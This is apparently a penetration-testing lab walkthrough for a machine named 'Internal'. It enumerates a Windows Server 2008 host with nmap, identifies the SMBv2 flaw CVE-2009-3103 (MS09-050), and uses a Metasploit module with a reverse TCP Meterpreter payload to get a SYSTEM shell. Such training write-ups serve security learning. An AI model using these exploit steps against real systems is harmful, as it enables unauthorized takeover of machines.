_____

# Exploitation Guide for Internal

## Summary

This machine is exploited via a vulnerability in an old version of Microsoft Windows SMB server, which is found by performing a fingerprinting scan of the network services.

## Enumeration

### Nmap

We start off by running an `nmap` scan:

```
kali@kali~# nmap -p- 192.168.103.40                                         
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-16 20:53 EST
Nmap scan report for 192.168.103.40
Host is up (0.066s latency).
Not shown: 65522 closed ports
PORT      STATE SERVICE
53/tcp    open  domain
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 2016.34 seconds
```

The main services of note here are a DNS server, SMB server, and RDP server.

### SMB

Further enumeration of the SMB service reveals some more details about the host:

```
kali@kali~# nmap -sC -sV -p139,445 192.168.103.40
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-16 21:37 EST
Nmap scan report for 192.168.103.40
Host is up (0.066s latency).

PORT    STATE SERVICE      VERSION
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
|_clock-skew: mean: 2h39m59s, deviation: 4h37m08s, median: 0s
|_nbstat: NetBIOS name: INTERNAL, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:bf:f4:a4 (VMware)
| smb-os-discovery: 
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: internal
|   NetBIOS computer name: INTERNAL\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-12-16T18:37:16-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-12-17T02:37:15
|_  start_date: 2020-08-13T03:45:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.57 seconds
```

The main takeaway here is that the server is currently running Windows Server 2008 Standard 6001 Service Pack 1, which, if unpatched, will likely have a vulnerability in the SMB service.

## Exploitation

Using Nmap's built in scripting engine, we can run some scripts against the server that will detect any potential vulnerabilities:

```
kali@kali~# nmap -script=smb-vuln\* -p445 192.168.103.40                   
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-16 21:42 EST
Nmap scan report for 192.168.103.40
Host is up (0.067s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT

Nmap done: 1 IP address (1 host up) scanned in 60.92 seconds
```

The scan returns that the server is likely vulnerable to the vulnerability disclosed in CVE-2009-3103. A quick search for this shows that this is also known as Microsoft Security Bulletin [MS09-050](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2009/ms09-050). This vulnerability has a number of public exploits, including a [Metasploit Module](https://www.rapid7.com/db/modules/exploit/windows/smb/ms09_050_smb2_negotiate_func_index/):

```
kali@kali~# msfconsole                                                     
                                                  

                 _---------.
             .' #######   ;."
  .---,.    ;@             @@`;   .---,..
." @@@@@'.,'@@            @@@@@',.'@@@@ ".
'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'
     "--'.@@@  -.@        @ ,'-   .'--"
          ".@' ; @       @ `.  ;'
            |@@@@ @@@     @    .
             ' @@@ @@   @@    ,
              `.@@@@    @@   .
                ',@@     @   ;           _____________
                 (   3 C    )     /|___ / Metasploit! \
                 ;@'. __*__,."    \|--- \_____________/
                  '(.,...."/


       =[ metasploit v5.0.101-dev                         ]
+ -- --=[ 2049 exploits - 1105 auxiliary - 344 post       ]
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Metasploit can be configured at startup, see msfconsole --help to learn more

msf5 > search MS09-050

Matching Modules
================

   #  Name                                                       Disclosure Date  Rank    Check  Description
   -  ----                                                       ---------------  ----    -----  -----------
   0  auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh                   normal  No     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
   1  auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                      normal  No     Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference
   2  exploit/windows/smb/ms09_050_smb2_negotiate_func_index     2009-09-07       good    No     MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference


Interact with a module by name or index, for example use 2 or use exploit/windows/smb/ms09_050_smb2_negotiate_func_index

msf5 >
```

The final entry listed is an exploit for this vulnerability. To obtain a reverse shell, we simply have to enter in the IP address of our target and run the exploit, resulting in a SYSTEM level shell:

```
msf5 > use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf5 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set RHOSTS 192.168.103.40
RHOSTS => 192.168.103.40
msf5 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set LHOST 192.168.49.103
LHOST => 192.168.49.103
msf5 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > show options

Module options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.103.40   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   445              yes       The target port (TCP)
   WAIT    180              yes       The number of seconds to wait for the attack to complete.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.49.103   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Vista SP1/SP2 and Server 2008 (x86)

msf5 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > run

[*] Started reverse TCP handler on 192.168.49.103:4444 
[*] 192.168.103.40:445 - Connecting to the target (192.168.103.40:445)...
[*] 192.168.103.40:445 - Sending the exploit packet (938 bytes)...
[*] 192.168.103.40:445 - Waiting up to 180 seconds for exploit to trigger...
[*] Sending stage (176195 bytes) to 192.168.103.40
[*] Meterpreter session 1 opened (192.168.49.103:4444 -> 192.168.103.40:49159) at 2020-12-16 22:12:54 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 3484 created.
Channel 1 created.
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>hostname
hostname
internal

C:\Windows\system32>

```
